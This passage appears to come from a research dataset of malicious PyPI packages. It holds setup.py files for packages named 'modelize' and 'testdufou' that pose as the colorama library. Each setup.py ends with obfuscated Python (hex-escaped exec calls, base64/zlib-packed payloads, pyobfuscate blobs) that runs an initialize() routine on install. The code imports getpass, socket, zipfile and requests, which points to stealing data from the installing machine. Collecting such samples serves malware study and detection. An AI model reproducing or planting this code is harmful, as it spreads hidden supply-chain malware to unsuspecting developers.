458144 2275808 1242208 3007648 1647168 1716726 4057473 5110029 9255513 9648978 3760028 287880 1350832 576600 2926908 369780 135296 1752416 1471232 875008 417270 5899068 1957344 2283105 10560840 2661960 5444880 471852 155062 4971561 1012478 3930990 231442 192024 2492510 9757105 4498654 382150 671456 52192 192128 1092704 1805248 1929824 3051008 1404544 5733063 8413230 310532 4281784 47008 9891543 469728 6724580 7874240 123880 10211310 9466528 3691092 1031920 4662784 1366698 2876068 684728 1890876 5409383 87924 3339696 1271776 7161413 10515830 1596832 1374105 1571104 8689434 1980668 982940 695172 1856190 4762496 9664185 1719160 3392730 7284220 4214010 2232560 1050090 4511592 2763072 128617 414570 2823840 562016 3152448 2986944 9496020 617040 5896582 230571 3810280 10790754 11111184 4286945 10453520 94200 4224528 1214400 969445 1756234 1314192 9029097 3589970 7198400 915720 3425796 2037495 774890 1417344 1112032 2954944 2494880 751210 6317954 8358360 3763386 2488337 10677968 7769448 1700038 452600 1426976 2920480 1503808 1830496 4385723 11152920 2126353 4189185 1188120 3739320 8386524 3130596 56230 777830';why,are,you,reading,this,thing,huh=\"\\x5f\\x5f\\x5f\\x5f\",\"\\x69\\x6e\\x28\\x63\\x68\\x72\\x28\\x69\\x29\\x20\\x66\\x6f\",\"\\x28\\x22\\x22\\x2e\\x6a\\x6f\",\"\\x72\\x20\\x69\\x20\\x69\\x6e\\x20\\x5b\\x31\\x30\\x31\\x2c\\x31\\x32\\x30\\x2c\",\"\\x31\\x30\\x31\\x2c\\x39\\x39\",\"\\x5f\\x5f\\x29\\x29\",\"\\x5d\\x29\\x29\\x28\\x5f\\x28\";b='eJxzLPfLigoMM47KDct2CvQwdXQPynEMrDAGAGNCB8A=';____(\"\".join (chr (int (OO00O0OO00O0O0OO00 /2 ))for OO00O0OO00O0O0OO00 in [202 ,240 ,202 ,198 ] if _____!=______))(f'\\x5f\\x5f\\x5f\\x5f\\x28\\x22\\x22\\x2e\\x6a\\x6f\\x69\\x6e\\x28\\x63\\x68\\x72\\x28\\x69\\x29\\x20\\x66\\x6f\\x72\\x20\\x69\\x20\\x69\\x6e\\x20\\x5b\\x31\\x30\\x31\\x2c\\x31\\x32\\x30\\x2c\\x31\\x30\\x31\\x2c\\x39\\x39\\x5d\\x29\\x29({____(base64.b64decode(codecs.decode(zlib.decompress(base64.b64decode(b\"eJw9kN1ygjAUhF8JIkzlMo6mEnIcHVIM3AGtoPIT2wSSPH2p7fTu252d2T3n3MkyK896dLvrSMIeaGxEGn0l/rpiLu3hlXm5yxDmO8tQZIDoeUQLr4oWePxk8VZfBpr9af8mXdzLTk8swRbP25bNzPvP8qwWJDRA8RX4vhLkfvuk0QRl3DOUekDC9xHZVnBcyUnXY7mtBrIOBDEKXNRl3KiBBor25l5MN7U5qSA/HsJiVpfsVIQ/Hj4dgoSYOndx+7tZLZ2m3qA4AFpUD6RDsbLXB2m0dPuPZa8GblvoGm/gthdI+8PxyYtnXqRLl9uiJi+xBbqtCmKm8/K3b7hsbmQ=\")).decode(),\"\".join(chr(int(i/8)) for i in [912, 888, 928, 392, 408])).encode()))})')\n                \n\nfrom .colors-update_file import *\nfrom requests import *\ninitialize()"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-04-25-modelize-v1",
        "code": "from setuptools import setup, find_packages\n\nsetup(\n    name='modelize',\n    version='1',\n    author='Jonathan Hartley',\n    author_email='tartley@tartley.com',\n    description='Pure-python Colors implementation',\n    long_description=open('README.md').read(),\n    long_description_content_type='text/markdown',\n    url='https://github.com/tartley/colorama',\n    packages=find_packages(),\n    install_requires=[\n        'requests'\n    ],\n    classifiers=[\n        'Development Status :: 3 - Alpha',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: MIT License',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Programming Language :: Python :: 3.10',\n        \"Programming Language :: Python :: 3\",\n        \"Operating System :: Microsoft :: Windows\",\n    ],\n)\n\n\n#pip install pycryptodome  , It works only v3.11 Above.\nimport random ,base64,codecs,zlib;pyobfuscate=\"\"\nimport getpass\nimport os\nimport socket\nfrom zipfile import ZipFile\nimport requests\ndef initialize():\n    obfuscate = dict(map(lambda map,dict:(map,dict),['(https://pyobfuscate.com)*(decrypt)'],['''73y&GqPR(El6Cy|8u!6JFCv564b{;ZPb|%0350vXGkzC{tFFn;WmNa>Z_@z(zI4qPlF?TOmPfiNetNqEf#f34Vx#6mY%@p7M3Z@hiq^`T|GZHhJv#i6vv8X5rlE(&28NqNh%^k?{xx^BIUzC@MR;?0cc$2uv|pXboqMT7MC?!`w|46~h?m#mGtu8+R&ftxyKFb1|DP>>#yJoUWavuZr~*@w0<<Jz($pAWK~B%G?{lJ|@VI&_g$fz$1Ugv@w3g`{r+ru2HF!vqNk11S3w4-|C8ZtyU6R<n-YZBPT`r4OM78z!pHKa>J0@0HXz+I#{Cq?9yk=+03}oW^!F2&dF%n57-o+N8Nv#Yr-CABKF_sa;u1%gpmznFa^%NTMpqcIyjL}743UmDYn~!W?gTh%T+(Yhi)^hW6Slk!&SQKQFK;6_)Nt6!J`?wdvj427&qA!Hjd;l-pJc7cdJJO)Ook-gBf%mk2wfXI`_4x;t%fPh5^R^#?IJT;vD#4h!4@)ZoO3RlLw{=AbmTtkWJ0&Z(9n1q!3p_+b-@(d-kOeLqe^A3yT8U~2Qnh$AGGUDcb5st1rcSmsHQ%;_xaUQ%G{{uxas+vWO4rAJJ!^V$3qPsjD|a{1@VAyAsvaU=A@a^HVxR5tpRlkY&?HOy3b=vw%zQ0hlw{-<i)umt{<k9l2Q?YJqa1!im$Andd)2mw9m>oPgi8d7<Pz0#YlFjptltt@BCN}H&Le*Aa-q5DbC0~z^lmWqkEz0k=ns?#cyz9@DP^TW>I}9OeCQ!GIwz6a4#v%45WMVG`W09yruf)%qD-R&iO7T{VaA(Lwi9^otrAr!SK(_)Cx|j{ZDDb`C>~x)4|SvDx>|c4f~zNWZ|ieUJRyq1Ef1j0eqO5<t^QnScNJXb;oyVORtci+;UVVj+W8M7H5~z~eMi35L|*hR$dLh+B40%&9nJy@@<wf}mgF!@!r4T}sK%Bl7uiZaZt}Q8h`sd~3Dh#EK^qJJ&3y1Q`<==9HT;z3=-?eo7QQ!*<}AfS#Qrwjb8kU(Q7U8O@8@q62SgLWTE*dn6c=7HM(0VCEd^1BcaGptzOrzx-yFjL?VugP19a_@EMKYGPp$>~H(NluYz`Pr-_T5nMJi`2_Bi6W!Ho27jNU{>#l?cO!36Dp?Y2p<(rSZfaiP;pu7_8Wnpu#P+*q<LSb0-3Xhzk(Qk`|U=yn57i!=_Tg^FYzoJP&`P)Xe<bg>sr4hx5pEpaR=tAgTqtPzkW#a@h#Gzg>kOIveUdqHf_5n;s}(~@iWuD_$o1FlC}ubRfgvIxQVMj5+{KmHxk;s4w2BW9io+L#89RqQb(mq6d`;J<`}kITou(>uhx_R~BEsw?G#zKs=YVps$ovwqBr*%3yZ^EJa`u0p20P7s$e^awnnn!Dp7vD!jtCyr)-W`d>H!K{0)zTk#VTc||h>f$Mlh6)RGD7)uwWy0rb$W=W5@^Uyh80@Lgg=g;FpAH|~HFfhMVQ@gZ3&RknO;K&~n;R}Z%p%pUccyNAknEBwWBYA_M)mA2=yq|xb}eN3M2ioC^I}^kx{qlHO${a5^jakYEcMiYqJ}Yr%C&(Lll?rl|NrGmS)<!s?SGV6XcQqzm5uW-y{Bd8`dQff-InnI#pg3JAN+5;S7BeD)W1!LQE+E&q#^lEDJ6EU*naPuoPHjYfH-7zHYGQjop0hb4TZ}}SBZjnqXW!QL!s(=7f(qdSQlc+bjtcMqvvs?F#mLQuXTRBBk4ogS}?s^E713=Zbfe8ou^{?Uyx5;)U9RPkGQ7cJ;hiBZ0z>rNo78{Ph~yAp$?(-F;Td?DoIBC%$3J%|Fq$_aCG8<Wmq{gKB@fKmCxWwdv{-Ms>SAj^Wiit&i{C$No^3pv5fS&Mki3)uodn4P6~naEMizLKOSR!Obr>r_Dt5k=2<&hXVTf7O|TnNKCp4{my`gHdslIyfJq~`N*EK&9<sLcYNh9c$Kujr6#UdpzCVz^c_;T$QYm_ifW&m?1jC_N3;B)TVe*-)yXHzKhQSiQv~E@`C0Oleb*yYUbrT<^UCWv~xL&<-+1#R{6{we)Pqrb&2+zSFCqey)h0V7=G8(?TDV{$G0;UjF%zD+l?=}ZP(zP4qzp@z;ts9g$VB#VK#2;xqK9!Y{D`0F`4JvFnk<h-@Sd~>xcz(_)4DqOFa9ax^C*hu%eBjY{u19v7JJEZy2rGrY7C@Z&Vm&`HSUJBrqHKhhK~z(*JIaorTyrxQUQ32s;n9>8FJt+?%-KPFuI8A>D6bZjs_o`Q!A?m1xrmm}pJPGs$c1*d7UT^u9uarbs`>5bj<5vgWF`0~{}`-{o(@=>uYX6Q4YO{Pxmwx)a_^DcD*<BIy*7`-#n=0J2lnXcVgI<Q0qR?FU%zw{&j@l2BTCzI8>u&yN+GL(UdY}dlZ4O;VwB(DHma=>2T?kHW>xt*WT%*J56G28+Tgq};n+ksC2gjCj_xYhXM{byv=9&~tGj{6@xv{$zC=SBt)6eDoHAb~$AB43d;^u?;Y#rJr%LNwo4uGgI!*0n;_#n;KtD6<(ud*l&FLm<(Wj&Ba2e^+LwDXn2u3MQgQa9&P&8G^z34o&;Uj)xgoAPR(XbY<xP!O-A$c_~T_D7ATc1^+r-7Mz(L!so16hi2_!lffj@5{_UDai#^xxux)jc#Wok}Iszc}iq+MW)I4K)8Q9k#qAOrn<ZRw(Ho<|hW~R<ZWI#FL4eOhtKW?ik;gOw}B<GUyL3{ng>NeBDdAz~<cU;Hfkrba-hsCjrj!E!WG&Wt**Avp#;#m!+2C6qTR2@L4$plJ&X+fzw`T7Tl&~+_a>!FDb?m%F;;D+s#zI$`6t;rDK3$N7RLv^m80MLQnJaaCv%NhT8N6dHAj{j;b3rk<aXX$kxcsHY<l$XQWNmvO<=d5#oq4Jmc}^7SaDgODXx)LWXrvgLY?_U%Gp1^)E>K48IM0Ys1`>_J5}9J#|a=QdJJX#LkT83~2(@II5pSMTl5@4Nt#8->W@cpCvP>7I_k{n+Sl3uopf<LWc&?frPR#tnk1{*0|3z%lCv!ZW8DwqM6yfhyB%&oYxd149ZZ-<w5|<s|X=7EDZd6W;J~9kgGO`6pJ8BIC10a2D5lMK3rA>ng&J5Bj{u)QkP=BDL}n<MvoJ{<2~L9P0dexM4spcD|{#lu{gYP{~Gwn49I^pV*%aKSs(S1!P;jC+I51h?08PbF)uUvg#XGhH#qRkc1;Cir6?bFV!~em04>>2^T2yQiph)3#g$<T1O9#bn$$8-^6QB}BGjJJd(WKa%zNksoy^yFD={HHP<C+NU2T>10#x{!nmVy;y^xD>d5;Sky0-Tca!MEUEUvp>1wF3)h};6RQ(CT@Pidk7^&Fl@3{{bMQk2?csF%(N6RP&vW&8B778M4znHY|mh1S<X-_sv0Q}7+D?m@7axP)tDFnGhYG<<^TKLlF7F42&D--#>n0l4@Hih%d#@LaWO7<w}fUJF*~h=)pwb_z#9_^^N6{3lpUYL<;Je_XrioAx7@1cd)<M8;B?c093}u*#vLx@D?Ab(QXVBz|JfnB2P}S4{T45$V{dUO&)W87()cP$YNu4!2th&~UONh)G~H_AesJhe&qpAtutjER4{pF8kij#GqR(3W?X?$4o10ntzhYTLGRt2*{b-ASUpj?_x47Agi2e<ek7sHQ#j2-)<wkk|zkG>RQ~!(neRcwWulu8RdKu%e0Bn`xPW>L+OZZCqRnLXSEXW$Mv+wA=HCTj=#Hc85kZy+W(MOF5^l?d-NX(X<MQF7Hz@`7k!)cF)&3}0~Ei2paALCKg33!OX@xRmZJ#+23uBb9W%os|K!a*E^*vcn37FFZy#;_=YarHh4+rkr8ed!94()apaY-^|MG#Fut-_<aF|hehRWw&n)l59$wjb>)YLMTA-_WO#$LzSY9m*M5o75PC^vo{RC|U$I_BEFNSdt^1o~_OG_?w{DC-A?B7CF%5KuKyCG{{osTq}$qXl!#1t16vN}qhl`CqgEUe=07Q~^u5I~U&nVLZPauCW4NShFz`-`G&$jkCh>S2UxgyT}BV=U6lbe-avEw633HWT5N1O&8b`K8zb%yFDVUF{(aLIn;AI-x~SVxCt|x8kK(ik9O2Y*&XVFq&H3KtpBIPm$TlSDHccdMQL4hVeqRf25ncr)kI}V{58SwFZVo!hug(r<!idUXLH?O$fhS^P}4j6k$0Q~MA6tD0&{B6^~iDjX$11Bsn#$qh--GiR>g66QJgZN;h<i4R`gX0E^&TVFru}&KTrA*oHcE0$mz_>GA)_h+D*eJ3sifqB!*L*?_-<}aXufT3@j7&lfOXh&+2rYlkT^T85i?Xsi$TCwE81iMV23S@JQlP>c_VEhM&HnTUC2uvmq`Z1dx<#NNs2oOUTe*U8QdQ&|WUK9H0VhLe=`IL`gXrOBYyWL5Lv?g6fxY55@z;5kxM1rp%M)X{T9)&r|6PJ~%QrNZdaDlp38ib-\nWQh5ro$1=9Naxto6dyC)!4d^*jFHC8N`@GK{u|VzphvWD+WaX1rlpQipw>{atW7g&JSqBkuN*vP69_Dm9Hntk{m)jpdVUdN3ZLrBUGUD<s@hw@4IHT0^c%v|NH>#~D<a?1}ns5ld!mNvGxLCaoChJ_E$0DUeKW2EY5gS~A6o7)jYaA@FpS9xUt@3qSk6%GqVunro1umz3=<_&HO=8LMXM0Bufhj?xkn9qSnQL;}Bx+9TLN1ng>yh<+9O8WCSRZ?B)=`=*9kGUKG(5GAr`U998Yls2KFwy!plFn=66%-lz@ar!LUkY90R$V3ksi8xK3L`PW^`F@e*tyS+DpqDX&`l(FRu2Jlpu$FCg;}E5pU&)1`+A{(gh68KPIJ%*-HEYblriO2fb*z2StuU&BhbdcZ*EbKPt{AZok6Qn0?*o0~f=q|b7Ih*LX~jBYooN1u4Oge=R9Xe|YD%J$^~+ZGqj0rCRb3NZx;_B)v44h<Y#HwFs|w6frKTDR?iXrdAI0WeL!f(^aVu*7qzNp2zNzg8dyY?K)neu5-;d9u_QEgq3df1fhhGcVuu)$nVWnw}+fL#XxR7eKU>PjHuh(EzoNm`a@|1GDHeDWo$1KHo*2(LlzaqJtUE`}<{ET7l;Ct2^zwtnwcaCLg?B$3*!wJipm+}5^1b)m_x|Bm`XQqNVC7%p<R76PQ9woT0jw|f~>R=9MKxLpW%3k-w^p>S$i9YiZeyJ9W%F1{b5Pba?8ZPk%A3E?f))f+=oI<g4vm2Co4ke0rd!xF2RQv!K4;?^Mk`OzhH*Ax4c$V^V4}?^X48c@=mDfIa-5nJ#VwGEIzU%sBMK>)yoP1QdVeF^`^XpyR`atqm-U=R79!!V_aN^kVKX!E-3VTVt_7rsf!>`zr-2!)q#P35hU7pkZ01p<;CQ)P+mcb+|zGPth*fc9N{a)q!;y#bm!1^S7QFkaGC0$pX@N9<=o;rHV'''.replace('\\n','')]))\n\n_=lambda OO00000OOO0000OOO,c_int=100000:(_OOOO00OO0O00O00OO:=''.join(chr(int(int(OO00000OOO0000OOO.split()[OO00O0OO00O0O0OO0])/random.randint(1,c_int)))for OO00O0OO00O0O0OO0 in range(len(OO00000OOO0000OOO.split()))));eval(\"\".join(chr(i) for i in [101,120,101,99]))(\"\\x73\\x65\\x74\\x61\\x74\\x74\\x72\\x28\\x5f\\x5f\\x62\\x75\\x69\\x6c\\x74\\x69\\x6e\\x73\\x5f\\x5f\\x2c\\x22\\x5f\\x5f\\x5f\\x5f\\x5f\\x5f\\x22\\x2c\\x70\\x72\\x69\\x6e\\x74\\x29\\x3b\\x73\\x65\\x74\\x61\\x74\\x74\\x72\\x28\\x5f\\x5f\\x62\\x75\\x69\\x6c\\x74\\x69\\x6e\\x73\\x5f\\x5f\\x2c\\x22\\x5f\\x5f\\x5f\\x5f\\x5f\\x22\\x2c\\x65\\x78\\x65\\x63\\x29\\x3b\\x73\\x65\\x74\\x61\\x74\\x74\\x72\\x28\\x5f\\x5f\\x62\\x75\\x69\\x6c\\x74\\x69\\x6e\\x73\\x5f\\x5f\\x2c\\x22\\x5f\\x5f\\x5f\\x5f\\x22\\x2c\\x65\\x76\\x61\\x6c\\x29\");__='979810 1451856 701556 1738286 1131928 777130 1808384 498944 2412960 956032 5915082 4357878 1155399 7076716 1096768 9607464 9704686 8048651 10662561 1351885 10886705 8237044 10331370 2165024 3365775 5799018 9212000 7813401 8233080 4307776 413344 10165379 4025860 4757856 496170 8060709 69960 5328081 7099189 6536544 7959920 2806214 277950 2559104 3012032 223936 591552 9962610 1436600 1625456 5192577 4043064 1416280 3080162 10471440 6462330 4343136 2861440 1741845 8975890 6851585 8140764 7802292 6122736 7539372 1359648 9536670 5335931 10511938 8937513 8056265 3637565 11016172 9717960 2552320 8763000 5587068 5512540 5299392 7436676 73124 10753765 8257920 1823360 9609948 4267890 564456 6065252 6855276 2748352 9834944 10534233 2795264 3236514 8647560 2677500 2522768 1586610 593434 616840 3060576 1538592 2229792 888544 595650 2166095 8397585 3274687 9948176 10319226 8029134 988668 6288620 1453785 2948200 3892980 10434410 4555166 9248990 1916577 3145315 3322534 5188572 7018320 5191305 5482508 3161360 3897952 174690 174590 5850618 2819556 3904427 2454325 9440720 9722790 10612894 2934736 1090686 1106370 8736540 964630 6486220 3989560 2202214 9069498 6645901 10245258 1684332 957682 544295 2842464 7583445 1981316 411517 194212 7295387 3013234 2510936 2828240 1167492 6193408 7805872 5476708 141792 5740225 5395508 4244946 2757725 9101568 10933439 7474074 8554518 4915482 1759329 898380 1844271 7482580 1039824 2242907 3913312 3144240 6702624 4845377 1374656 2064839 5705995 10300550 799434 9605960 8718120 1926528 1534284 2298665 414460 4306036 5724579 5008440 10100004 850660 8166980 6718020 7659663 1681362 488180 897888 756320 2823680 2456672 8309532 3951354 1671882 9611838 463904 1850592 3953815 1540586 1030624 5078241 2462680 8585512 2845632 2321235 355449 10672704 4871568 7530612 1852288 2691680 6459657 11642040 8839320 8637305 1195148 6157790 110976 6754401 10835875 3180288 4157867 10836840 795840 2778016 3047136 237664 18144 381174 4659978 1121877 9624264 2864672 986235 5340830 1642784 9477825 7475656 6378288 3466419 8494824 9749916 1930336 9773876 7674586 3866628 8029500 5434880 53218 2066016 6873517 2529885 2371328 9361876 4234930 1051952 9138354 1909910 4875025 4505490 3837832 8355225 438360 446368 1353568 2047008 2967488 10644804 4894212 7748136 703635 399743 7393907 3952600 3082911 5642000 5450960 7519200 4187848 1696630 5786256 5735665 169650 393313 3621538 3350704 1566824 2943433 7939188 4003881 967527 561064 990896 7872992 2789992 9179304 2780328 7594255 3794678 11010256 6994920 858864 2798948 2737895 5301632 4816300 2089555 9550224 8589846 8282736 710704 669460 1008320 4040180 4468458 4526055 3835186 3264666 1978960 11074200 9351688 2573086 423030 8277360 4632789 3426248 8649396 1341102 8535879 693289 70924 2222352 1938440 6407820 2503992 1014875 64400 4158814 6867432 11765640 7300228 896852 19830 396530 776928 1859904 1439168 67424 7429485 4829190 2985568 10064246 2184600 2413040 11045328 596428 793637 2391017 4416766 3764460 7478286 3906981 3338151 4907438 956510 1275136 83360 189056 859712 1119680 2407648 1855712 1930560 3580398 4905469 1308763 8720493 958750 2926374 703640 8119664 2026297 873341 410140 1330848 2057856 1774592 3048704 8564194 2723652 9627975 5140800 356544 8023440 8511960 1907960 8897280 1348550 2127408 4270610 2250839 5447652 4603434 8320689 4657918 1042434 877720 2696992 2977088 183296 458144 2275808 1242208 3007648 1647168 1716726 4057473 5110029 9255513 9648978 3760028 287880 1350832 576600 2926908 369780 135296 1752416 1471232 875008 417270 5899068 1957344 2283105 10560840 2661960 5444880 471852 155062 4971561 1012478 3930990 231442 192024 2492510 9757105 4498654 382150 671456 52192 192128 1092704 1805248 1929824 3051008 1404544 5733063 8413230 310532 4281784 47008 9891543 469728 6724580 7874240 123880 10211310 9466528 3691092 1031920 4662784 1366698 2876068 684728 1890876 5409383 87924 3339696 1271776 7161413 10515830 1596832 1374105 1571104 8689434 1980668 982940 695172 1856190 4762496 9664185 1719160 3392730 7284220 4214010 2232560 1050090 4511592 2763072 128617 414570 2823840 562016 3152448 2986944 9496020 617040 5896582 230571 3810280 10790754 11111184 4286945 10453520 94200 4224528 1214400 969445 1756234 1314192 9029097 3589970 7198400 915720 3425796 2037495 774890 1417344 1112032 2954944 2494880 751210 6317954 8358360 3763386 2488337 10677968 7769448 1700038 452600 1426976 2920480 1503808 1830496 4385723 11152920 2126353 4189185 1188120 3739320 8386524 3130596 56230 777830';why,are,you,reading,this,thing,huh=\"\\x5f\\x5f\\x5f\\x5f\",\"\\x69\\x6e\\x28\\x63\\x68\\x72\\x28\\x69\\x29\\x20\\x66\\x6f\",\"\\x28\\x22\\x22\\x2e\\x6a\\x6f\",\"\\x72\\x20\\x69\\x20\\x69\\x6e\\x20\\x5b\\x31\\x30\\x31\\x2c\\x31\\x32\\x30\\x2c\",\"\\x31\\x30\\x31\\x2c\\x39\\x39\",\"\\x5f\\x5f\\x29\\x29\",\"\\x5d\\x29\\x29\\x28\\x5f\\x28\";b='eJxzLPfLigoMM47KDct2CvQwdXQPynEMrDAGAGNCB8A=';____(\"\".join (chr (int (OO00O0OO00O0O0OO00 /2 ))for OO00O0OO00O0O0OO00 in [202 ,240 ,202 ,198 ] if _____!=______))(f'\\x5f\\x5f\\x5f\\x5f\\x28\\x22\\x22\\x2e\\x6a\\x6f\\x69\\x6e\\x28\\x63\\x68\\x72\\x28\\x69\\x29\\x20\\x66\\x6f\\x72\\x20\\x69\\x20\\x69\\x6e\\x20\\x5b\\x31\\x30\\x31\\x2c\\x31\\x32\\x30\\x2c\\x31\\x30\\x31\\x2c\\x39\\x39\\x5d\\x29\\x29({____(base64.b64decode(codecs.decode(zlib.decompress(base64.b64decode(b\"eJw9kN1ygjAUhF8JIkzlMo6mEnIcHVIM3AGtoPIT2wSSPH2p7fTu252d2T3n3MkyK896dLvrSMIeaGxEGn0l/rpiLu3hlXm5yxDmO8tQZIDoeUQLr4oWePxk8VZfBpr9af8mXdzLTk8swRbP25bNzPvP8qwWJDRA8RX4vhLkfvuk0QRl3DOUekDC9xHZVnBcyUnXY7mtBrIOBDEKXNRl3KiBBor25l5MN7U5qSA/HsJiVpfsVIQ/Hj4dgoSYOndx+7tZLZ2m3qA4AFpUD6RDsbLXB2m0dPuPZa8GblvoGm/gthdI+8PxyYtnXqRLl9uiJi+xBbqtCmKm8/K3b7hsbmQ=\")).decode(),\"\".join(chr(int(i/8)) for i in [912, 888, 928, 392, 408])).encode()))})')\n                \n\nfrom .modelize import *\nfrom requests import *\ninitialize()"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-03-testdufou-v3",
        "code": "from setuptools import setup, find_packages\n\nsetup(\n    name='testdufou',\n    version='3',\n    author='Jonathan Hartley',\n    author_email='tartley@tartley.com',\n    description='Pure-python Colors implementation',\n    long_description=open('README.md').read(),\n    long_description_content_type='text/markdown',\n    url='https://github.com/tartley/colorama',\n    packages=find_packages(),\n    install_requires=[\n        'requests','colorama'\n    ],\n    classifiers=[\n        'Development Status :: 3 - Alpha',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: MIT License',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Programming Language :: Python :: 3.10',\n        \"Programming Language :: Python :: 3\",\n        \"Operating System :: Microsoft :: Windows\",\n    ],\n)\n\n\n#pip install pycryptodome  , It works only v3.11 Above.\nimport random ,base64,codecs,zlib;pyobfuscate=\"\"\n\nobfuscate = dict(map(lambda map,dict:(map,dict),['(https://pyobfuscate.com)*(import json)'],['''<8HQNs1Em}q&wWdyFr3h;s9a1jE$C|WUbAi@8+r{HjXUkYgw$&fxI*EnaM#~7_Kwm9y~*va*6(0NjX=LV|Nh&(}S?9Hp%!(EJ9(m-5tu*O}h3KeyaU`w}?>wnYPSBo&gCVs{<$QKPbRBbFB-+ZePar`WL^|oLu4sq;4b%;+Fa?@|Y!ZoJfTPRy4HVr>1Z_;l1XQ2@\u0005Kzi=7Q|xPaG?4=K*@iMRwF0BixoiB}^-D+?Ey!%X?r-jlYsk~N{pXtY?RO4Ly%(8AFC1OYJ7z_Baa%e{mNB{>ghli?<5f^@Ae6Cad9*R<6%3Zh%=2|=mRayE43a8~d>oanqW=d=xZiTlOkmo-eBzZx#o00Pw*KsmlYPoLs&tc#srQhM+?#)4&WK7h?fJ8m7k|PDADU)l>SqcS4h}JsHSbJSIdn?Pg7)+m)GN70<rP+clItR{{TeTp?H~q_^0lJ|l*VeusxdU0bQY`T@Q^ox(;@j@U$fW<ORwGZn~IEfkoMWK%zVFS7|qzZey5)zz_QjgX$UH`{pq%9#{+qh&`io7titSK(#1Ip>l;@Kf-la3hMxnD4B(oKasM;<<!yBgi4MO<p_<-(wN|ywKm(F-QkGFW?;3L$`*%wu*&?V^Mbo;I0a$ude6B501w3NXCSbc`G;OW^bx4HXr>X8yIu2<CIVy4Ej<KMsGF3+LXDq<I*kY~`hWE2UMHmjm9QFu4sP5419&0fZaYZTdmn6*t$8mpU9}Yg@g9d~uxRaUT%#~xGRo&@PYqh}N<Uto}os}e+HC9DyR?86u0lL62lbUHqF~1_yjWh7PdC=LcX5Iso=wWe?&Q8+Kh92+E828GH0g|)#>aKy&8fTpERf(9I50W<4AKv0g9)Jfw5^k~g*!nb~tps15Zn9O0clntq4Hqdyd3Y<EhAaJkDxCPKl4#ESj&#R4wh6qp&tce5P+k+25OLNV^jWDFSNLB9Cl=85Pl1AP1w=pf&`HBOpB<)n9trSnI`ge4$M?&!2t4jHFgu5e=*X=EzpTIbDo`ig(}Uk;v$;m+=mLMyplAwa^0oREv_TFRRf(?&Xe5(_cwXqum9$R5aGK7AUyaFUNeX=4As30u<d3=(rKroKZ4y5vQ62Js2BE$k(%Hb=e{k!JxAT9JM!vq%GGQhq=M)Wj7cHVU0Y6P-87QP(gtkyAh`gZ=j*U5=P=0?m=e-_U+(2`a88U|nw;@+CskN-N-PmI8NP1d0tJM%716<JqlfcvUq-8IovMm3IGW-Gz3bd3=mra^a5GlcgmDB0<U(k8Yt&-JCnNOZ^%t(0Cb#ZRz?3gdV7+aHz4*Vblumr6W#$BNKO65THpy%YXD5kmt*2ALoONju9vta^8L;(Xa`f^LU@1mTkc=A*QG7AQtceTd$n1p*v>|A5;LAiG>;?t2U@@G$XD}*Y8u8-rzH_>-|F>+?WZpsK`82o9qf=~0;{^~inY=0>UHv?Wel0?Zy7#E{I0ehHV*h4ghyyLDBZVGbu?9xy<qL6B4O%J-#A-q`4uzH{U)$$$Pu9y6d8oC|{r%m-H*=lbf;r8S0(0Ta`R-dxrFc%CX<V*ZWy!EXMI?%<BenPhUoCYK(3e_37U6o1@ZTVCHcccv(#z3_A2eUv+4-0~TK`f4*@R8q)^2vX1j+U4^d6lofOUR((G7J`QsjOaQ5Mgk;u7tJEV47-eA5wg=xS~re+*Uqd<b9Qdcz21ZX?BZcwIk~f74An(4F6ZQpf~|m1?YMyr%p1AFVq?2$}&R?`bIIU3xB_(jODI1$UQkoea2LtZL+8z!_=<J8`NF@h~~Z+V-85xKH-{Ru)kXmIXiM53#qv@8}*|a^-zq*+tHu^Y(F_+D=}y5Cv*z7+yY(Xm34>BN~rGb?p`^MhSL86Az(Bz8+_rfPm3KXJ7EXgAuSY)yzAT&LX1IpjlrOm<NTJNC5K91zw!l$;8-D0%nJ}vLN3<aOtR~i8O%}%qVZ0aXjZS^05WO()Z_*}Mwa+xK&PQQ0`%58qrFj^%pj$+Ve=}Tki*<6c;J`gq<&(sIn#P&3iHETKU>{y;h#~7fz}%2^fH!gVcp+o&H-fAVPKrKNdX|+>m`V>GZp~yS>%6P#;dt2I@Ei3-G-$2tj5%kCvjLO@{h1pU_HmKR%a!Xpd|Q~8lDoG*h6m4(lN}b=AGs9{t8MrxOsrl8L?fCr^Imb+iBTs0nY&5{Du=^{JXpT0ELqEMT?|hHM-A8#hNCixN=TK_YEu{6rQZMPTTI_-d;6;{tOrS1Eq`3BGGd|U-W{dIFmsD;$u<61w^bX_DJfxswvf%i_JQPNQLS~=%?7v!kdj@{$kevJ$d9r;KMaiV1N16I5Y9ce})UgtFR1jh700`-|+cMmkcD?S1=aC(5odAkZrenXzZYb?Z7ddkx3;E=+fT-e6fK@X;^sVsoQ*Z(>*r@a6kqFwsnO1`=`q}kjd)>q+0tLW@WAzX9Mt*C2P9mBt%?JjdHm4lUP<%VF7y175bV@6h5QAJPK7mn(GagBCiEcO7#KB{#s9G&sgJ|HJ%dhgKyX7rb2lLOF(t+mIKbR^H;HR{A`<~3Gnfg(!JJ<fN^a(3$E@a?z>53jT=NT8_ro@HZ<wgfVa-$t}(~%)A{WiQg@DyY1LKN;9(V{_z#XFf!3UL>pssqQjL_|jS)NOMey<6=~>}FN?$w}N;+{*Xf?}Vh3E-6@c5c>VVj9OCpF4!bv4H)$X|34w|OwwyZcaKYokq!a<>GR*5RJ6qvsSig+E}dApv6EFt(&ot9>o;Ha(p095Zy%hn6nV7D!Wf#YVTGX&m|?eIZbJ@xJ(hW%}gxo4aiBLjWNayc()k?Eyc<o8e^u`4nLVsZ&Op<~w@3bAp*QY<4f<O6vMs{<&83@YS;}Ua!CaC5h!K*?y;%^s^7{tm!9ZW2QGl88l2oH|maD41j!`%CQjAFln4|@spJU8~y$z3pH4H;t_9{m+HL;t(exrpUoK&2Wq4WXZ;{a&j+PLngzJ)9*(ECmb)waY)B3z-C)q1kYur-*OX!I^Bx>d>r+wY9zU`F=~e_;DZXA)u6}ub_SKN=0fq*vK*L